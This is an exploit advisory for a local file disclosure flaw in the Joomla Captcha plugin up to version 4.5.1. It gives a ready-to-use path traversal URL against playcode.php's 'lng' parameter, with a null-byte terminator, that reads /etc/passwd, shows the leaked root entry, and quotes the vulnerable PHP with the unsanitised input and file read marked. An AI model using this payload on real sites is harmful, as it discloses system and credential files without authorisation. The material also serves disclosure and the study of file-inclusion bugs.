#  [ Joomla Captcha Plugin <= 4.5.1 ]  Local File Disclosure Vulnerability  #
#############################################################################
#
# Script: "Joomla Captcha plugin and patch for Joomla!"
#
# Script site: http://www.kupala.net/
# Download: http://code.google.com/p/joomla15captcha/
#
#
# [LFI] (magic_quotes_gpc = Off)
# Vuln: http://site.com/plugins/system/captcha/playcode.php?lng=../../../../../../../etc/passwd%00
#       dun@radius ~ $ cat joomlacaptcha.mp3
#       root:x:0:0:root:/root:/bin/bash
#       ......
#
# File: ./plugins/system/captcha/playcode.php
#
#     79   if (!$captchacode) $captchacode = &#039;0000000000&#039;;                                
#     80  
#     81   session_write_close();
#     82  
#     83   @$lng = $_GET[&#039;lng&#039;];                                                 // [1]
#     84   if ( !$lng ) $lng = &#039;en-gb&#039;;
#     85  
#     86   $captchafilename = "joomlacaptcha.mp3";
#     87   $captchalength = strlen( $captchacode );
#     88  
#     89   $outlength = 0;
#     90   $reallength = 0;
#     91   $currsize = 0;
#     92   $outstream = &#039;&#039;;
#     93  
#     94   if ($captchalength > 0) {
#     95       for ($i = 0; $i < $captchalength; $i++) {
#     96           $soundfiles[$i] = &#039;files/&#039; . $lng . &#039;.&#039; . strtolower( substr( $captchacode, $i, 1 ) ) . &#039;.mp3&#039;;   // [2]
#     97       }
#     98       foreach ($soundfiles as $onefile){                                     //
#     99           if (file_exists( $onefile )) {                                 //
#    100               $instream = fopen( $onefile, &#039;rb&#039; );                   //
#    101               $currsize = filesize( $onefile );                      // [3]
#    102               $outstream .= fread( $instream, $currsize );           //
#    103               $outlength += $currsize;                               //
#    104               fclose( $instream );                                   //
#    105               $reallength += 1;                                      //
#    106           }
#    107       }
#    108   }
#    109  
#    110   if (($outstream == &#039;&#039;) || ($captchalength != $reallength)) {
#    111           $outstream = 0; $outlength = 1;
#    112   }
#    113  
#    114   ob_start();
#    115   header( &#039;Content-Type: audio/x-mpeg&#039;);                                         //
#    116   header( "Content-Disposition: attachment; filename=$captchafilename;");        //
#    117   header( &#039;Content-Transfer-Encoding: binary&#039;);                                  //
#    118   header( &#039;Content-Length: &#039;.$outlength);                                        //
#    119   echo $outstream ;                                                              // [4] LFD
#    120   ob_end_flush();



